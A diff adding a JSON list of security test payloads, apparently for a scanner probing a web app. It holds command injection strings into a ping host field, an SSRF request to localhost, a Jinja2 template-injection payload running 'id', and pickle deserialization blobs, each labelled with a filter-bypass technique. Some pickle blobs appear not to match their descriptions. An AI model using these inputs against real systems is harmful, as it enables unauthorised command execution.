@@ -1,0 +1,62 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVJQAAAAAAAC5dq1KCX19idWlsdGluX19xAFsKcQFdcQJScQMu"
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "minimal pickle opcode (empty list) to bypass strict filters"
+  },
+  {
+    "id": "dyn_deser_2",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVDQAAAAAAAC5jYnVpbHRpbnMKZXZhbApxAFgGAAAAcHJpbnRxAVgGAAAAaGVsbG9xAlRxA1Uu"
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle protocol 2 with __reduce__ chain to trigger response"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1;id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "semicolon command separator (not in block_patterns)"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\tid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "tab character IFS bypass"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "direct localhost IP (may bypass hostname allowlist)"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Jinja2 sandbox escape via __class__ chain (if sandbox disabled)"
+  }
+]
